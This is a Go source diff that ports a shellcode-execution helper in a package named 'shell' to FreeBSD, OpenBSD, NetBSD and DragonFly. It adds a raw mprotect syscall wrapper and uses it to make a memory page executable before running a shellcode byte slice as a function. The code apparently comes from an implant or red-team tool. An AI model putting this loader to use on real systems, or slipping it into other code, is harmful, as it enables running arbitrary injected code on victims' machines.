@@ -1,5 +1,5 @@
-//go:build linux || darwin
-// +build linux darwin
+//go:build freebsd || openbsd || netbsd || dragonfly
+// +build freebsd openbsd netbsd dragonfly
 
 package shell
 
@@ -9,6 +9,7 @@ import (
 	"os/exec"
 	"syscall"
 	"unsafe"
+	"errors"
 )
 
 func GetShell() *exec.Cmd {
@@ -30,12 +31,32 @@ func getPage(p uintptr) []byte {
 	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
 }
 
+func MprotectBSD(b []byte, prot int) (err error) {
+    _zero := []byte("")
+    var _p0 unsafe.Pointer
+    if len(b) > 0 {
+        _p0 = unsafe.Pointer(&b[0])
+    } else {
+        _p0 = unsafe.Pointer(&_zero)
+    }
+    _, _, e1 := syscall.Syscall(syscall.SYS_MPROTECT, uintptr(_p0), uintptr(len(b)), uintptr(prot))
+    if e1 != 0 {
+	// err = syscall.errnoErr(e1)
+	if e1 == 0 {
+		return nil
+	} else {
+		return errors.New("syscall error")
+	}
+    }
+    return
+}
+
 // Set the memory page containing the shellcode
 // to R-X, then executes the shellcode as a function.
 func ExecShellcode(shellcode []byte) {
 	shellcodeAddr := uintptr(unsafe.Pointer(&shellcode[0]))
 	page := getPage(shellcodeAddr)
-	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
+	MprotectBSD(page, syscall.PROT_READ|syscall.PROT_EXEC)
 	shellPtr := unsafe.Pointer(&shellcode)
 	shellcodeFuncPtr := *(*func())(unsafe.Pointer(&shellPtr))
 	go shellcodeFuncPtr()
